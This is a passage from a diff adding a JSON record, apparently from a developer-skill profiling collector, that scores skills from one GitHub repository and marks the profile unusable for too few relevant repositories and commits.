+      "signal_count": 2,
+      "sources": [
+        "topic",
+        "repo_name"
+      ],
+      "max_strength": 0.3,
+      "total_bytes": 0,
+      "commit_count": 4,
+      "first_seen": "2025-10-06T00:15:04+00:00",
+      "last_seen": "2026-09-17T00:18:18+00:00",
+      "details": [
+        "qnap-docker: repo topic 'docker'",
+        "qnap-docker: 'containers' in repo name/description"
+      ]
+    },
+    {
+      "skill_id": "python",
+      "repos": [
+        "Fpeople4646/qnap-docker"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "topic"
+      ],
+      "max_strength": 0.3,
+      "total_bytes": 0,
+      "commit_count": 4,
+      "first_seen": "2025-10-06T00:15:04+00:00",
+      "last_seen": "2026-09-17T00:18:18+00:00",
+      "details": [
+        "qnap-docker: repo topic 'python'"
+      ]
+    },
+    {
+      "skill_id": "monitoring",
+      "repos": [
+        "Fpeople4646/qnap-docker"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "repo_name"
+      ],
+      "max_strength": 0.2,
+      "total_bytes": 0,
+      "commit_count": 4,
+      "first_seen": "2025-10-06T00:15:04+00:00",
+      "last_seen": "2026-09-17T00:18:18+00:00",
+      "details": [
+        "qnap-docker: 'monitoring' in repo name/description"
+      ]
+    }
+  ],
+  "tier": "unusable",
+  "usability": {
+    "tier": "unusable",
+    "checks": {
+      "skill_relevant_repos": {
+        "actual": 2,
+        "required": 3,
+        "tier": "relaxed"
+      },
+      "readable_repos": {
+        "actual": 3,
+        "required": 1,
+        "tier": "relaxed"
+      },
+      "total_commits": {
+        "actual": 15,
+        "required": 20,
+        "tier": "strict"
+      },
+      "distinct_skills": {
+        "actual": 7,
+        "required": 3,
+        "tier": "strict"
+      }
+    },
+    "failed": [
+      "skill_relevant_repos",
+      "total_commits"
+    ],
+    "reason": "skill_relevant_repos: 2 < 3; total_commits: 15 < 20"
+  },
+  "search_stratum": "go-systems",
+  "collected_at": "2026-09-17T01:27:30.429702+00:00",
+  "collector_version": "0.1.0",
+  "notes": [
+    "unusable - skill_relevant_repos: 2 < 3; total_commits: 15 < 20"
+  ]
+}
